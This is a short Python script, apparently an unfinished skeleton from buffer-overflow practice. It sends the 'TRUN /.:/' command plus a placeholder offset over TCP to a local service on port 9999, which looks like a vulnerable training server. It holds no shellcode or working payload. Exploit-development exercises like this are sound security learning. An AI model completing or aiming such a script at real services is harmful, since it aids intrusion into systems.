import sys
import socket

target_host = "127.0.0.1"  # Replace with the target IP address
target_port = 9999  # Replace with the target port

buffer = "TRUN /.:/"
offset = "SOMETHING I WILL ADD LATER"
payload = buffer + offset

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_host, target_port))
    s.send(payload.encode())
    response = s.recv(4096)
    print(response.decode())

except Exception as e:
    print(f"Error occurred: {str(e)}")
    sys.exit(1)
